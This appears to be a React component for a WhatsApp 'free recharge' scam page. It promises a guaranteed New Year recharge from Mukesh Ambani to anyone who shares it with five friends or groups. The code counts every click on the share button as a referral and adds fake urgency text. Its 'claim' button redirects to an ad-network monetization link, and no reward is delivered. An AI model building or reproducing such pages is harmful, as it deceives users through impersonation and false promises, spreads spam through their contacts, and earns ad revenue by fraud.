'use client';

import { useState, useEffect } from 'react';
import {
  Check,
  Copy,
  Gift,
  Loader2,
  Share2,
  PartyPopper,
  Zap,
  Star,
} from 'lucide-react';
import { Button } from '@/components/ui/button';
import {
  Card,
  CardContent,
  CardDescription,
  CardFooter,
  CardHeader,
  CardTitle,
} from '@/components/ui/card';
import { Progress } from '@/components/ui/progress';
import { checkForFraud } from './actions';
import { useToast } from '@/hooks/use-toast';
import {
  AlertDialog,
  AlertDialogAction,
  AlertDialogContent,
  AlertDialogDescription,
  AlertDialogFooter,
  AlertDialogHeader,
  AlertDialogTitle,
} from '@/components/ui/alert-dialog';

const REFERRAL_GOAL = 5;

export default function RechargeOffer() {
  const [referrals, setReferrals] = useState(0);
  const [referralLink, setReferralLink] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const [showSuccessDialog, setShowSuccessDialog] = useState(false);
  const { toast } = useToast();

  useEffect(() => {
    // This runs only on the client, avoiding hydration errors.
    setReferralLink(
      `${window.location.origin}?ref=${Math.random()
        .toString(36)
        .substring(2, 9)}`
    );
  }, []);

  const handleShare = async () => {
    const text = `🎉 Mega New Year Bonanza! 🎉\nCelebrate 2026 with a GUARANTEED FREE recharge from Mukesh Ambani! Simply share this amazing offer with 5 friends or groups to instantly claim your reward. This is a limited-time festive offer, don't let it slip away!\n\n${referralLink}`;
    const encodedText = encodeURIComponent(text);
    const whatsappUrl = `https://api.whatsapp.com/send?text=${encodedText}`;

    // Attempt to open WhatsApp directly
    window.open(whatsappUrl, '_blank');
    
    // Assume share was successful and update referral count
    if (referrals < REFERRAL_GOAL) {
      setReferrals(referrals + 1);
    }
  };

  const handleClaimReward = async () => {
    setIsLoading(true);
    const result = await checkForFraud(referrals);
    setIsLoading(false);

    if (result.isFraudulent) {
      toast({
        variant: 'destructive',
        title: 'Fraud Alert!',
        description: result.fraudulentReason,
      });
    } else {
      window.location.href = 'https://www.effectivegatecpm.com/junbhmwqq?key=e52b9f85bae2f594c627fa88d6cddf86';
    }
  };

  const progressValue = (referrals / REFERRAL_GOAL) * 100;
  const isGoalReached = referrals >= REFERRAL_GOAL;

  return (
    <>
      <Card className="overflow-hidden shadow-lg transition-all duration-300 hover:shadow-2xl">
        <CardHeader className="p-6 pb-2 text-center">
          <CardTitle className="text-2xl font-bold flex items-center justify-center gap-2">
            <Zap className="text-primary animate-pulse" />
            🎉 Mega New Year Bonanza! 🎉
          </CardTitle>
          <CardDescription className="text-md mt-2">
            Celebrate 2026 with a{' '}
            <strong>GUARANTEED FREE recharge from Mukesh Ambani!</strong> Simply
            share this amazing offer with{' '}
            <strong>{REFERRAL_GOAL} friends or groups</strong> to instantly claim
            your reward. This is a limited-time festive offer, don't let it
            slip away!
          </CardDescription>
        </CardHeader>
        <CardContent className="p-6 pt-4">
          <div className="space-y-4">
            <div>
              <div className="flex justify-between items-center mb-2">
                <p className="text-sm font-medium text-foreground/80">
                  Your Progress
                </p>
                <p
                  className={`text-sm font-bold ${
                    isGoalReached ? 'text-primary' : 'text-foreground'
                  }`}
                >
                  {referrals} of {REFERRAL_GOAL} Referrals
                </p>
              </div>
              <Progress value={progressValue} className="h-3" />
            </div>

            <div className="flex items-center gap-2 text-sm text-muted-foreground p-2 bg-muted/50 rounded-md">
              <Star className="h-4 w-4 text-primary" />
              <span>
                Hurry! Thousands of users are claiming their free recharge every
                hour!
              </span>
            </div>
          </div>
        </CardContent>
        <CardFooter className="bg-muted/30 p-6">
          {isGoalReached ? (
            <Button
              className="w-full text-lg py-6 animate-in fade-in zoom-in-95"
              onClick={handleClaimReward}
              disabled={isLoading}
              size="lg"
            >
              {isLoading ? (
                <>
                  <Loader2 className="mr-2 h-5 w-5 animate-spin" />
                  Verifying Your Referrals...
                </>
              ) : (
                <>
                  <Gift className="mr-2 h-5 w-5" />
                  Claim Your FREE Recharge Now!
                </>
              )}
            </Button>
          ) : (
            <Button
              className="w-full text-lg py-6"
              onClick={handleShare}
              size="lg"
            >
              <Share2 className="mr-2 h-5 w-5" />
              Share on WhatsApp & Claim
            </Button>
          )}
        </CardFooter>
      </Card>
      <AlertDialog open={showSuccessDialog} onOpenChange={setShowSuccessDialog}>
        <AlertDialogContent>
          <AlertDialogHeader>
            <div className="mx-auto flex h-12 w-12 items-center justify-center rounded-full bg-primary/10 mb-4">
              <PartyPopper className="h-6 w-6 text-primary" />
            </div>
            <AlertDialogTitle className="text-center text-2xl">
              Congratulations! You've Unlocked Your Gift!
            </AlertDialogTitle>
            <AlertDialogDescription className="text-center">
              You've successfully shared with {REFERRAL_GOAL} friends. Your special
              New Year recharge from Mukesh Ambani is being processed and will be
              credited shortly. Enjoy the gift and a very Happy New Year!
            </AlertDialogDescription>
          </AlertDialogHeader>
          <AlertDialogFooter>
            <AlertDialogAction onClick={() => setShowSuccessDialog(false)}>
              Awesome!
            </AlertDialogAction>
          </AlertDialogFooter>
        </AlertDialogContent>
      </AlertDialog>
    </>
  );
}
